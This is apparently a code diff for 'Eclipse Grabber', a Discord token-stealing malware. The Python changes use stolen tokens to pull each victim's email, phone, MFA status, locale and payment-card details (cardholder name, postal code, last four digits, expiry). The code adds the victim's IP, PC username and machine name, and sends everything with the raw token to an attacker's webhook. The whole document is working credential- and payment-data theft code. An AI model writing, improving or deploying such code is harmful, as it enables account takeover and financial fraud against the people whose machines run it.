@@ -103,49 +103,75 @@ class Account():
         self.account_data: dict = open_url(self.DISCORD_API_URL, self.token)
         if not self.account_data:
             return
-        self.name: str = self.account_data.get("username")
-        self.discriminator = self.account_data.get("discriminator")
-        self.id: str = self.account_data.get("id")
-        self.email: str = self.account_data.get("email")
-        self.phone: str = self.account_data.get("phone")
-        self.nitro: bool = bool(self.account_data.get("premium_type"))
-        self.avatar_id: str = self.account_data.get("avatar")
+        self.name: str = self.account_data.get('username')
+        self.discriminator = self.account_data.get('discriminator')
+        self.id: str = self.account_data.get('id')
+        self.email: str = self.account_data.get('email')
+        self.phone: str = self.account_data.get('phone')
+        self.mfa: bool = self.account_data.get('mfa_enabled')
+        self.locale: str = self.account_data.get('locale')
+        self.nitro: bool = bool(self.account_data.get('premium_type'))
+        self.avatar_id: str = self.account_data.get('avatar')
         self.avatar_url: str = (f"https://cdn.discordapp.com/avatars/"
                                 f"{self.id}/"
                                 f"{self.avatar_id}")
-        self.billing: str = open_url(self.DISCORD_API_URL
-                                     + "/billing/payment-sources",
-                                     self.token)
+        self.billing_data: str = open_url(self.DISCORD_API_URL
+                                          + "/billing/payment-sources",
+                                          self.token)
+
+    def billing_info(self) -> List[str]:
+        if not self.billing_data:
+            return "None"
+        billing_info = []
+        for bill in self.billing_data:
+            billing_info.append(
+                f"Id: {str(bill.get('id'))}\n"
+                f"Owner: {bill.get('billing_address').get('name').title()}\n"
+                f"Postal Code: {bill.get('billing_address').get('postal_code')}\n"
+                f"Invalid: {str(bill.get('invalid'))}\n"
+                f"Brand: {bill.get('brand').capitalize()}\n"
+                f"Last digits: {bill.get('last_4')}\n"
+                f"Expires: {str(bill.get('expires_month'))}"
+                f"/{str(bill.get('expires_year'))}\n"
+                f"Country: {bill.get('country')}"
+                )
+        return billing_info
+
+
+def field_former(title: str, text: str, inline: bool = True) -> str:
+    return {
+        "name": f"**{title} Info**",
+        "value": text,
+        "inline": bool(inline)
+        }
 
 
 def embed_accounts_info(accounts: List[Account], host: Computer) -> List[dict]:
     embeds = []
     for account in accounts.values():
+        account_info = (
+            f'Email: {account.email}\n'
+            f'Phone: {account.phone}\n'
+            f"Nitro: {'Enabled' if account.nitro else 'Disabled'}\n"
+            f"MFA: {'Enabled' if account.mfa else 'Disabled'}\n"
+            f"Lang: {account.locale.capitalize()}"
+            )
+        pc_info = (
+            f'IP: {host.ip}\n'
+            f'Username: {host.username}\n'
+            f'PC Name: {host.name}\n'
+            f'Token App: {account.token_location}')
+
+        fields = []
+        fields.append(field_former("Account", account_info))
+        fields.append(field_former("PC", pc_info))
+        if account.billing_data:
+            fields.append(field_former("Billing", account.billing_info()[0]))
+        fields.append(field_former("Token", account.token, False))
+
         embeds.append({
-            "color": 0x7289da,
-            "fields": [
-                {
-                    "name": "**Account Info**",
-                    "value": (f'Email: {account.email}\n'
-                              f'Phone: {account.phone}\n'
-                              f'Nitro: {account.nitro}\n'
-                              f'Billing Info: {bool(account.billing)}'),
-                    "inline": True
-                },
-                {
-                    "name": "**PC Info**",
-                    "value": (f'IP: {host.ip}\n'
-                              f'Username: {host.username}\n'
-                              f'PC Name: {host.name}\n'
-                              f'Token App: {account.token_location}'),
-                    "inline": True
-                },
-                {
-                    "name": "**Token**",
-                    "value": account.token,
-                    "inline": False
-                }
-            ],
+            "color": 0x6A5ACD,
+            "fields": fields,
             "author": {
                 "name": (f"{account.name}#"
                          f"{account.discriminator} "
@@ -153,7 +179,7 @@ def embed_accounts_info(accounts: List[Account], host: Computer) -> List[dict]:
                 "icon_url": account.avatar_url
             },
             "footer": {
-                "text": "Token Grabber",
+                "text": "Eclipse Grabber by @3ct0s and @JM1k1",
             }
         })
     return embeds
@@ -163,8 +189,8 @@ def send_webhook(embeds: List[dict], WEBHOOK_URL: str):
     webhook = {
         "content": "",
         "embeds": embeds,
-        "username": "Discord Token Grabber",
-        "avatar_url": "https://i.imgur.com/tvBUBXR.png"
+        "username": "Eclipse Grabber",
+        "avatar_url": "https://imgur.com/Ymo8GEe.png"
     }
     data = dumps(webhook).encode()
     return open_url(WEBHOOK_URL, None, data)
